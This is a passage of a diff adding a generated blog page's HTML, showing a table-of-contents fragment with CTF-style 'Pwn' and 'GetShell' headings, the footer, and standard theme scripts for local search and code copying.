class="nav-number">3.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GetShell"><span class="nav-number">3.1.</span> <span class="nav-text">GetShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Array"><span class="nav-number">3.2.</span> <span class="nav-text">Array</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">hydewww</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/schemes/muse.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+  <script src="/js/js.cookie.js?v=7.1.1"></script>
+  <script src="/js/scroll-cookie.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('3');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script>
+  $('.highlight').each(function(i, e) {
+    var $wrap = $('<div>').addClass('highlight-wrap');
+    $(e).after($wrap);
+    $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+      var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+        return $(e).text();
+      }).toArray().join('\n');
+      var ta = document.createElement('textarea');
+      var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+      ta.style.top = yPosition + 'px'; // Prevent page scroll
+      ta.style.position = 'absolute';
+      ta.style.opacity = '0';
+      ta.readOnly = true;
+      ta.value = code;
+      document.body.appendChild(ta);
+      ta.select();
+      ta.setSelectionRange(0, code.length);
+      ta.readOnly = false;
+      var result = document.execCommand('copy');
+      
+        if (result) $(this).text('复制成功');
+        else $(this).text('复制失败');
+      
+      ta.blur(); // For iOS
+      $(this).blur();
+    })).on('mouseleave', function(e) {
+      var $b = $(this).find('.copy-btn');
+      setTimeout(function() {
+        $b.text('复制');
+      }, 300);
+    }).append(e);
+  })
+</script>
+
+
+  
+
+  
+
+</body>
+</html>
